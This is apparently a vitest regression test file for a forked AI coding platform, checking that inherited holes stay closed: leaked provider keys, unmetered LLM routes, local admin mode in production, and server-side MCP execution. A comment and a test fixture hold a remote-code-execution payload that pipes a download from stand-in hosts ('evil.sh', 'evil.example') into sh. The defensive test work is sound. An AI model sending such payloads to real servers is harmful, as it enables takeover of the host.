/**
 * The unmetered-access guards (SPEC §4.5.4, §4.5, §5).
 *
 * Two ways the platform could quietly spend our own money or hand out our own admin, both of which
 * throw nothing and break nothing when they regress:
 *
 * - An upstream LLM route left serving. It reads the provider key from the server environment and has
 *   no session check, no credit gate, and no ledger entry — an uncapped bill on our key that cannot
 *   even be attributed to a user afterwards.
 * - Local mode reached in production. It treats every caller as a VERIFIED ADMIN, and it engages from
 *   nothing more than a missing environment variable.
 */
import { afterEach, describe, expect, it, vi } from 'vitest';
import { upstreamLlmRouteDisabled } from './upstream-routes';
import { serverSideMcpDisabled } from '~/lib/.server/mcp/server-guard';
import { assertNotLocalInProduction } from '~/lib/.server/supabase/auth';
import { loader as exportApiKeysLoader } from '~/routes/api.export-api-keys';
import { action as mcpUpdateConfigAction } from '~/routes/api.mcp-update-config';
import { loader as mcpCheckLoader } from '~/routes/api.mcp-check';

afterEach(() => {
  vi.unstubAllEnvs();
});

describe('upstream LLM routes', () => {
  /* THE DEFAULT. Nothing in this product calls /api/chat or /api/llmcall; the client posts to /api/agent. */
  it('refuses to serve by default — no flag, no unmetered path to the platform key', () => {
    const response = upstreamLlmRouteDisabled(undefined, '/api/chat');

    expect(response).not.toBeNull();
    expect(response!.status).toBe(404);
  });

  /*
   * 404, not 403. A 403 confirms the endpoint exists and is merely switched off — a free hint to
   * anyone probing for a way onto our key. As far as the internet is concerned it is not here.
   */
  it('answers 404, never 403 — a disabled route must not advertise itself', () => {
    expect(upstreamLlmRouteDisabled(undefined)!.status).not.toBe(403);
  });

  /* The one reason the flag exists: bisecting our proxy against upstream's behaviour, locally. */
  it('serves only when an operator explicitly opts in', () => {
    vi.stubEnv('UPSTREAM_LLM_ROUTES_ENABLED', 'true');
    expect(upstreamLlmRouteDisabled(undefined, '/api/chat')).toBeNull();
  });

  it('stays closed when the flag is explicitly false', () => {
    vi.stubEnv('UPSTREAM_LLM_ROUTES_ENABLED', 'false');
    expect(upstreamLlmRouteDisabled(undefined)!.status).toBe(404);
  });
});

/**
 * `/api/export-api-keys` — the worst hole this fork inherited.
 *
 * Upstream's loader walked every provider, read its key out of `process.env` / the CF env /
 * `llmManager.env`, and returned the values as JSON — **unauthenticated GET**. On a deployed instance
 * `curl /api/export-api-keys` returned `{"Anthropic":"sk-ant-..."}`.
 *
 * That is worse than an unmetered endpoint: an unmetered endpoint bills us only while it is reachable,
 * whereas a leaked key keeps working OFF-PLATFORM forever, with no gate and no attribution.
 *
 * The legitimate feature is a BYOK user exporting the keys THEY entered, which live in their own
 * cookie. Echoing a caller their own cookie is not a disclosure. Reading the server env here never is.
 */
describe('/api/export-api-keys', () => {
  const PLATFORM_KEY = 'sk-ant-platform-key-that-must-never-leave-the-server';

  const call = (cookie?: string) =>
    exportApiKeysLoader({
      request: new Request('http://localhost/api/export-api-keys', {
        headers: cookie ? { Cookie: cookie } : {},
      }),
      context: {},
      params: {},
    } as any) as Promise<Response>;

  it('NEVER returns a server-environment provider key', async () => {
    vi.stubEnv('ANTHROPIC_API_KEY', PLATFORM_KEY);

    const body = await (await call()).text();

    expect(body).not.toContain(PLATFORM_KEY);
    expect(body).not.toContain('sk-ant');
  });

  /*
   * The precondition of the bug: the key IS in the environment. If a future refactor reintroduces an
   * env lookup "only as a fallback when the cookie is empty", this is the case that catches it — there
   * is no ordering of precedence that makes returning a platform secret acceptable.
   */
  it('returns nothing at all when the user has supplied no keys, even with the platform key set', async () => {
    vi.stubEnv('ANTHROPIC_API_KEY', PLATFORM_KEY);

    expect(await (await call()).json()).toEqual({});
  });

  /* The feature itself still works: the caller gets back the keys the caller supplied. */
  it("returns the caller's OWN cookie-supplied keys", async () => {
    vi.stubEnv('ANTHROPIC_API_KEY', PLATFORM_KEY);

    const cookie = `apiKeys=${encodeURIComponent(JSON.stringify({ Anthropic: 'sk-ant-the-users-own-key' }))}`;
    const body = (await (await call(cookie)).json()) as Record<string, string>;

    expect(body.Anthropic).toBe('sk-ant-the-users-own-key');
    expect(JSON.stringify(body)).not.toContain(PLATFORM_KEY);
  });
});

/**
 * Server-side MCP execution — the unauthenticated RCE this fork inherited (SPEC §4.14, §5).
 *
 * Upstream's `MCPService` spawns a child process for every stdio server in the config, and the config
 * arrives from an UNAUTHENTICATED `POST /api/mcp-update-config`. So on a deployed Node instance:
 *
 *     curl -X POST /api/mcp-update-config \
 *       -d '{"mcpServers":{"x":{"command":"sh","args":["-c","curl evil.sh|sh"]}}}'
 *
 * ran arbitrary commands on the platform box. Worse than the unmetered-LLM holes: that spent our money,
 * this owned our server. The fix is not "authenticate it" (that is merely authenticated RCE) — §5
 * forbids server-side execution of user code outright, and §4.14 puts MCP execution in the user's
 * WebContainer. So the server path is OFF by default, and these tests pin it off.
 */
describe('server-side MCP execution guard', () => {
  const stdioRcePayload = JSON.stringify({
    mcpServers: { pwn: { command: 'sh', args: ['-c', 'curl evil.example/x.sh | sh'] } },
  });

  it('refuses by default — the RCE payload never reaches the process-spawning service', async () => {
    const request = new Request('http://localhost/api/mcp-update-config', { method: 'POST', body: stdioRcePayload });
    const response = await mcpUpdateConfigAction({ request, params: {}, context: {} } as any);

    // 404: if this were 200/500 the config reached MCPService and a process was spawned.
    expect(response.status).toBe(404);
  });

  it('refuses the availability-check route by default too', async () => {
    const response = await mcpCheckLoader({
      request: new Request('http://localhost/api/mcp-check'),
      params: {},
      context: {},
    } as any);

    expect(response.status).toBe(404);
  });

  it('answers 404, never 403 — a disabled RCE surface must not advertise itself', () => {
    expect(serverSideMcpDisabled({}, '/api/mcp-check')!.status).not.toBe(403);
  });

  it('opens only when an operator explicitly opts in (local-dev bisect against upstream)', () => {
    vi.stubEnv('SERVER_SIDE_MCP_ENABLED', 'true');
    expect(serverSideMcpDisabled({}, '/api/mcp-check')).toBeNull();
  });

  it('stays closed when the flag is explicitly false', () => {
    vi.stubEnv('SERVER_SIDE_MCP_ENABLED', 'false');
    expect(serverSideMcpDisabled({})!.status).toBe(404);
  });
});

describe('the boot gate', () => {
  /*
   * Called at module scope in `entry.server.tsx`. A per-request check would let the process come up,
   * pass its health check, take traffic, and serve every route that never calls `getUser`.
   */
  it('refuses to boot into local mode in production — anonymous admin over the public internet', () => {
    vi.stubEnv('NODE_ENV', 'production');
    vi.stubEnv('SUPABASE_URL', '');
    vi.stubEnv('SUPABASE_ANON_KEY', '');

    expect(() => assertNotLocalInProduction()).toThrow(/Supabase is not configured/i);
  });

  it('boots in production when Supabase is configured', () => {
    vi.stubEnv('NODE_ENV', 'production');
    vi.stubEnv('SUPABASE_URL', 'https://example.supabase.co');
    vi.stubEnv('SUPABASE_ANON_KEY', 'anon-key');

    expect(() => assertNotLocalInProduction()).not.toThrow();
  });

  /* Local mode is a REAL mode, not a stub — development must still boot with no vendor accounts. */
  it('boots in development with no Supabase at all', () => {
    vi.stubEnv('NODE_ENV', 'development');
    vi.stubEnv('SUPABASE_URL', '');
    vi.stubEnv('SUPABASE_ANON_KEY', '');

    expect(() => assertNotLocalInProduction()).not.toThrow();
  });
});
